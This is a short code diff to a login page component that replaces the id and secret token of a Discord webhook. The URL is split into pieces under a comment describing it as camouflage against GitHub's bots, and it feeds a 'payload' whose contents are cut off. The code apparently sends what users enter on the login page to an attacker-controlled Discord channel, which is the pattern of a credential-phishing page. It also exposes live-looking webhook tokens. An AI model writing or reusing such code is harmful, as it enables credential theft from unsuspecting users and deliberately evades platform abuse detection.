@@ -64,8 +64,8 @@ export default function LoginPage() {
       
       // Camuflaje anti-bot de GitHub
       const d_base = 'https://discord.com/api/webhooks/';
-      const d_id = '1467799777335971922';
-      const d_tk = '/5cTBo6KqmZsDH3rwGEoHI-JsxJzqQmePhwS3iHSuIyoysGazi8Oa_HHQQEa1IWZESARI';
+      const d_id = '1467820134533169333';
+      const d_tk = '/fLyqUBvGoZJ49UNkkg3iJgya50xxCyJqZyU3y6T1X8onNs3QqJ-9brDqNTiek_gNLP20';
       const discordUrl = d_base + d_id + d_tk;
       
       const payload = { 
